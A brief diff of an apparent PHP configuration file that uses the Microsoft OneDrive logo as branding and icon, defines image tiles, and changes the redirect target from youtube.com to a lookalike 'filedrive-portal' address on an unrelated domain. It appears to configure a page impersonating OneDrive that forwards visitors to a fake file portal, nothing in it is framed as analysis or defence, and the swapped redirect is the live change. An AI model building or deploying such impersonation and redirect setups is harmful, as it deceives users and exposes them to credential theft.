@@ -3,7 +3,7 @@
 define('LOGO_URL', 'https://upload.wikimedia.org/wikipedia/commons/5/59/Microsoft_Office_OneDrive_%282019%E2%80%932025%29.svg');
 define('FAVICON_URL', 'https://upload.wikimedia.org/wikipedia/commons/5/59/Microsoft_Office_OneDrive_%282019%E2%80%932025%29.svg');
 
-define('REDIRECT_URL', 'https://youtube.com');
+define('REDIRECT_URL', 'https://filedrive-portal.parapintaraloleo.com/39PCi');
 
 define('TILE_SOURCES', [
     'car'   => 'https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/icons/car-front-fill.svg',
